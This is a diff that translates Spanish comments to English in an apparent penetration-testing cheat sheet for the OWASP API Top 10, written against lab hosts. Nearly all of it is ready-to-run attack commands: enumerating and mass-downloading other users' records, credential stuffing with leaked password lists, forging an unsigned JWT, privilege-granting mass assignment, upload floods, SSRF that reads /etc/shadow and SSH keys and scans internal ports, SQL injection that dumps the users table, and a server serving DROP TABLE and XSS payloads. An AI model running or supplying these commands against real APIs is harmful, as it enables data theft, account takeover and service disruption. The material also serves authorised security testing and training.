@@ -15,7 +15,7 @@ sidebar:
 ### Locating Documentation
 
 ```bash
-# Endpoints de documentación comunes
+# Common documentation endpoints
 curl -s http://TARGET/docs | jq
 curl -s http://TARGET/api-docs | jq
 curl -s http://TARGET/openapi.json | jq
@@ -23,10 +23,10 @@ curl -s http://TARGET/swagger.json | jq
 curl -s http://TARGET/swagger/v1/swagger.json | jq
 curl -s http://TARGET/api/v1/swagger | jq
 
-# Buscar spec en source HTML
+# Search spec in source HTML
 curl -s http://TARGET/ | grep -iE "swagger|openapi|api-docs|redoc"
 
-# Fuzzing de endpoints (múltiples códigos — 405 = endpoint existe pero método incorrecto)
+# Fuzzing endpoints (multiple codes — 405 = endpoint exists but incorrect method)
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
      -u http://TARGET/api/v1/FUZZ \
      -mc 200,201,204,301,302,405
@@ -35,21 +35,21 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
 ### JWT Authentication
 
 ```bash
-# Login para obtener token
+# Login to obtain token
 curl -s -X POST http://TARGET/api/v1/user/login \
      -H "Content-Type: application/json" \
      -d '{"email":"user@target.htb","password":"P@ssw0rd"}' | jq
 
-# Guardar token
+# Save token
 TOKEN=$(curl -s -X POST http://TARGET/api/v1/user/login \
      -H "Content-Type: application/json" \
      -d '{"email":"user@target.htb","password":"P@ssw0rd"}' | jq -r '.token')
 
-# Usar token en requests
+# Use token in requests
 curl -s http://TARGET/api/v1/resource \
      -H "Authorization: Bearer $TOKEN" | jq
 
-# Registro de usuario
+# User registration
 curl -s -X POST http://TARGET/api/v1/user/signup \
      -H "Content-Type: application/json" \
      -d '{"email":"attacker@test.com","password":"Test1234!","name":"Test"}' | jq
@@ -64,14 +64,14 @@ curl -s -X POST http://TARGET/api/v1/user/signup \
 ### Enumerating IDs with Bash
 
 ```bash
-# Script para iterar IDs y extraer datos de otros usuarios
+# Script to iterate IDs and extract data from other users
 for i in $(seq 1 200); do
     echo -n "ID $i: "
     curl -s "http://TARGET/api/v1/resource/$i" \
          -H "Authorization: Bearer $TOKEN" | jq -c '.'
 done
 
-# Filtrar solo los que devuelven datos (excluir 404/error)
+# Filter only those that return data (exclude 404/error)
 for i in $(seq 1 200); do
     resp=$(curl -s "http://TARGET/api/v1/resource/$i" \
                 -H "Authorization: Bearer $TOKEN")
@@ -82,17 +82,17 @@ done
 ### Enumerating IDs with ffuf
 
 ```bash
-# Generar wordlist de IDs
+# Generate IDs wordlist
 seq 1 200 > ids.txt
 
-# Fuzz del ID en el path
+# Fuzz of the ID in the path
 ffuf -w ./ids.txt \
      -u "http://TARGET/api/v1/resource/FUZZ" \
      -H "Authorization: Bearer $TOKEN" \
      -fr "\"detail\":\"Not found\"" \
      -mc 200
 
-# Ejemplo real: yearly reports de proveedores
+# Real example: yearly reports of suppliers
 ffuf -w ./ids.txt \
      -u "http://TARGET/api/v1/supplier-companies/yearly-reports/FUZZ" \
      -H "Authorization: Bearer $TOKEN" \
@@ -103,12 +103,12 @@ ffuf -w ./ids.txt \
 ### Massive BOLA Data Download
 
 ```bash
-# Descargar archivos encontrados (PDF, etc.)
+# Download found files (PDF, etc.)
 for i in $(seq 1 50); do
     curl -s "http://TARGET/api/v1/files/$i" \
          -H "Authorization: Bearer $TOKEN" \
          -o "file_$i.pdf" 2>/dev/null
-    file "file_$i.pdf" | grep -q PDF && echo "Descargado: file_$i.pdf"
+    file "file_$i.pdf" | grep -q PDF && echo "Downloaded: file_$i.pdf"
 done
 ```
 
@@ -119,7 +119,7 @@ done
 ### Credential Stuffing with ffuf (Dual-Wordlist)
 
 ```bash
-# ffuf con dos wordlists simultáneas
+# ffuf with two simultaneous wordlists
 ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt:PASS \
      -w emails.txt:EMAIL \
      -u http://TARGET/api/v1/user/login \
@@ -129,14 +129,14 @@ ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt:PASS \
      -fr "Invalid Credentials" \
      -mc 200
 
-# Crear lista de emails objetivo
+# Create target emails list
 cat > emails.txt << EOF
 admin@target.htb
 user@target.htb
 john@target.htb
 EOF
 
-# Brute-force de password para usuario conocido
+# Brute-force of password for known user
 ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt \
      -u http://TARGET/api/v1/user/login \
      -X POST \
@@ -149,21 +149,21 @@ ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt \
 ### JWT Token — Analysis and Manipulation
 
 ```bash
-# Decodificar header y payload (sin verificar firma)
+# Decode header and payload (without signature verification)
 echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
 echo "eyJ1c2VyX2lkIjoiMSIsInJvbGUiOiJ1c2VyIn0" | base64 -d
 
-# Partes del JWT: header.payload.signature
+# Parts of the JWT: header.payload.signature
 TOKEN="eyJ...header...==.eyJ...payload...==.signature"
 PAYLOAD=$(echo $TOKEN | cut -d'.' -f2)
 echo $PAYLOAD | base64 -d | jq
 
-# Si la firma no se verifica → modificar payload y re-encodear (alg:none bypass)
+# If signature is not verified -> modify payload and re-encode (alg:none bypass)
 # Header: {"alg":"none","typ":"JWT"}
 echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
 # Payload: {"user_id":"1","role":"admin"}
 echo -n '{"user_id":"1","role":"admin"}' | base64 | tr -d '='
-# JWT sin firma: HEADER.PAYLOAD.
+# JWT without signature: HEADER.PAYLOAD.
 ```
 
 ---
@@ -173,19 +173,19 @@ echo -n '{"user_id":"1","role":"admin"}' | base64 | tr -d '='
 > Send extra fields in the body that the server processes even though it shouldn't.
 
 ```bash
-# Request normal de usuario
+# Normal user request
 curl -s -X PATCH http://TARGET/api/v1/user/profile \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"name":"My Company"}'
 
-# Mass Assignment: añadir campos privilegiados
+# Mass Assignment: add privileged fields
 curl -s -X PATCH http://TARGET/api/v1/user/profile \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"name":"My Company","isExemptedFromMarketplaceFee":true}'
 
-# Otros campos típicos a probar:
+# Other typical fields to test:
 # "role":"admin"
 # "is_admin":true
 # "verified":true
@@ -194,7 +194,7 @@ curl -s -X PATCH http://TARGET/api/v1/user/profile \
 # "subscription":"premium"
 # "approved":true
 
-# Confirmar que el campo fue modificado (GET del recurso)
+# Confirm that the field was modified (GET of the resource)
 curl -s http://TARGET/api/v1/user/profile \
      -H "Authorization: Bearer $TOKEN" | jq
 ```
@@ -204,17 +204,17 @@ curl -s http://TARGET/api/v1/user/profile \
 ## API4 — Unrestricted Resource Consumption
 
 ```bash
-# Generar archivo grande para DoS/abuso de storage
+# Generate large file for DoS/storage abuse
 dd if=/dev/urandom of=test_large.pdf bs=1M count=30   # 30 MB
 
-# Subir múltiples veces para agotar recursos
+# Upload multiple times to exhaust resources
 for i in {1..10}; do
     curl -s -X POST http://TARGET/api/v1/upload \
          -H "Authorization: Bearer $TOKEN" \
          -F "file=@test_large.pdf" | jq
 done
 
-# Probar límites de rate:
+# Test rate limits:
 for i in {1..50}; do
     curl -s -X POST http://TARGET/api/v1/resource \
          -H "Authorization: Bearer $TOKEN" \
@@ -230,21 +230,21 @@ done
 > Access admin functions/endpoints while being a normal user.
 
 ```bash
-# Endpoints de admin típicos a probar
+# Typical admin endpoints to test
 curl -s http://TARGET/api/v1/admin/users \
      -H "Authorization: Bearer $USER_TOKEN" | jq
 
-# Ver los reports de otro usuario sin ser admin
+# View another user's reports without being admin
 curl -s "http://TARGET/api/v1/reports?user_id=1" \
      -H "Authorization: Bearer $USER_TOKEN" | jq
 
-# Cambiar método HTTP — GET puede estar protegido, POST no
+# Change HTTP method — GET may be protected, POST not
 curl -s -X POST http://TARGET/api/v1/admin/action \
      -H "Authorization: Bearer $USER_TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"userId":1}' | jq
 
-# Probar endpoints con IDs de otros roles
+# Test endpoints with IDs of other roles
 curl -s "http://TARGET/api/v1/partner-companies/1/financials" \
      -H "Authorization: Bearer $USER_TOKEN" | jq
 ```
@@ -254,22 +254,22 @@ curl -s "http://TARGET/api/v1/partner-companies/1/financials" \
 ## API6 — Unrestricted Access to Sensitive Business Flows
 
 ```bash
-# Identificar datos de negocio expuestos en respuestas
+# Identify business data exposed in responses
 curl -s http://TARGET/api/v1/products \
      -H "Authorization: Bearer $TOKEN" | jq '.[].discount'
 
-# Explotar precios/descuentos expuestos
-# Ej: el endpoint devuelve el precio con descuento antes de que expire
+# Exploit exposed prices/discounts
+# E.g.: the endpoint returns the discounted price before it expires
 curl -s "http://TARGET/api/v1/products/1" \
      -H "Authorization: Bearer $TOKEN" | jq '{price, discountPrice, discountExpiry}'
 
-# Añadir al carrito con precio reducido (si el precio viene del client-side)
+# Add to cart with reduced price (if price comes from client-side)
 curl -s -X POST http://TARGET/api/v1/cart \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"productId":1,"quantity":999,"price":0.01}' | jq
 
-# Race condition para aprovechar ventana de descuento
+# Race condition to leverage discount window
 for i in {1..20}; do
     curl -s -X POST http://TARGET/api/v1/purchase \
          -H "Authorization: Bearer $TOKEN" \
@@ -284,14 +284,14 @@ wait
 ## API7 — SSRF via API
 
 ```bash
-# Identificar campos que aceptan URIs/URLs en el body de la API
-# Ejemplo: campo de certificado o archivo en formato URI
+# Identify fields that accept URIs/URLs in the API body
+# Example: certificate field or file in URI format
 curl -s -X POST http://TARGET/api/v1/company \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"name":"Test","CertificateOfIncorporationPDFFileURI":"http://OUR_IP:8000/test"}' | jq
 
-# Listener para confirmar SSRF
+# Listener to confirm SSRF
 nc -lnvp 8000
 
 # LFI via file:// scheme
@@ -300,18 +300,18 @@ curl -s -X POST http://TARGET/api/v1/company \
      -H "Content-Type: application/json" \
      -d '{"name":"Test","CertificateOfIncorporationPDFFileURI":"file:///etc/passwd"}' | jq
 
-# Leer el archivo: si el campo URI almacena y luego se hace GET
+# Read the file: if the URI field is stored and then a GET is made
 curl -s "http://TARGET/api/v1/company/1/certificate" \
      -H "Authorization: Bearer $TOKEN"
 
-# Archivos objetivo via SSRF file://
+# Target files via SSRF file://
 # file:///etc/passwd
 # file:///etc/shadow
 # file:///proc/self/environ
 # file:///var/www/html/config.php
 # file:///home/user/.ssh/id_rsa
 
-# Port scan interno via SSRF
+# Internal port scan via SSRF
 seq 1 65535 > ports.txt
 ffuf -w ./ports.txt \
      -u http://TARGET/api/v1/resource \
@@ -327,12 +327,12 @@ ffuf -w ./ports.txt \
 ## API8 — Security Misconfiguration (SQLi in APIs)
 
 ```bash
-# SQL Injection en path parameters
+# SQL Injection in path parameters
 # Endpoint: /api/v1/products/{Name}/count
 curl -s "http://TARGET/api/v1/products/laptop/count" \
      -H "Authorization: Bearer $TOKEN" | jq
 
-# SQLi básico en el path
+# Basic SQLi in the path
 curl -s "http://TARGET/api/v1/products/laptop' OR 1=1 --/count" \
      -H "Authorization: Bearer $TOKEN" | jq
 
@@ -340,21 +340,21 @@ curl -s "http://TARGET/api/v1/products/laptop' OR 1=1 --/count" \
 curl -s "http://TARGET/api/v1/products/laptop%27%20OR%201%3D1%20--/count" \
      -H "Authorization: Bearer $TOKEN" | jq
 
-# UNION-based para extraer datos
+# UNION-based to extract data
 curl -s "http://TARGET/api/v1/products/x' UNION SELECT 1,2,3 --/count" \
      -H "Authorization: Bearer $TOKEN" | jq
 
-# Extraer tabla de usuarios
+# Extract users table
 curl -s "http://TARGET/api/v1/products/x' UNION SELECT username,password,email FROM users --/count" \
      -H "Authorization: Bearer $TOKEN" | jq
 
-# SQLi en body JSON
+# SQLi in JSON body
 curl -s -X POST http://TARGET/api/v1/search \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"name":"laptop\" OR 1=1 --"}' | jq
 
-# SQLMap contra endpoint de API
+# SQLMap against API endpoint
 sqlmap -u "http://TARGET/api/v1/products/*/count" \
        --headers="Authorization: Bearer $TOKEN" \
        --level=3 --risk=2 --batch
@@ -365,30 +365,30 @@ sqlmap -u "http://TARGET/api/v1/products/*/count" \
 ## API9 — Improper Inventory Management (Legacy Versions)
 
 ```bash
-# Probar versiones antiguas de la API
+# Test legacy API versions
 curl -s http://TARGET/api/v0/user/info \
      -H "Authorization: Bearer $TOKEN" | jq
 
-# Endpoints sin auth en versiones viejas
+# Endpoints without auth in old versions
 curl -s http://TARGET/api/v0/admin/users | jq
 curl -s http://TARGET/api/v1/users | jq
 curl -s http://TARGET/v1/api/users | jq
 curl -s http://TARGET/api/users | jq
 
-# Fuzzing de versiones
+# Version fuzzing
 ffuf -w versions.txt \
      -u http://TARGET/api/FUZZ/users \
      -mc 200,201,401,403,405
 # versions.txt: v0, v1, v2, v3, v0.1, v1.0, v1.1, v2.0, beta, dev, internal, old, backup
 
-# Buscar endpoints sin auth en versión v0
+# Search endpoints without auth in version v0
 for endpoint in users admin reports accounts settings; do
     echo -n "v0/$endpoint: "
     curl -s -o /dev/null -w "%{http_code}" "http://TARGET/api/v0/$endpoint"
     echo ""
 done
 
-# Exportar hashes o datos sensibles de endpoint legacy
+# Export hashes or sensitive data from legacy endpoint
 curl -s http://TARGET/api/v0/users | jq '.[].password_hash'
 ```
 
@@ -397,14 +397,14 @@ curl -s http://TARGET/api/v0/users | jq '.[].password_hash'
 ## API10 — Unsafe API Consumption
 
 ```bash
-# Identificar si la API confía en datos de terceros
-# Ej: campo que se procesa desde una API externa sin sanitizar
+# Identify if the API trusts third-party data
+# E.g.: field processed from an external API without sanitizing
 
-# Verificar qué datos llegan del tercero
+# Verify what data arrives from the third party
 curl -s http://THIRD_PARTY_API/data | jq
 
-# Intentar inyección en los datos del tercero si podemos controlarlo
-# (crear un servidor que sirva datos maliciosos y usar SSRF para apuntarlo)
+# Attempt injection in third-party data if controllable
+# (create a server serving malicious data and use SSRF to point to it)
 python3 -c "
 import http.server, json
 
@@ -413,7 +413,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
         self.end_headers()
-        # Datos maliciosos con SQLi/XSS
+        # Malicious data with SQLi/XSS
         data = [{'name': \"'; DROP TABLE users; --\", 'value': '<script>alert(1)</script>'}]
         self.wfile.write(json.dumps(data).encode())
     def log_message(self, *args): pass
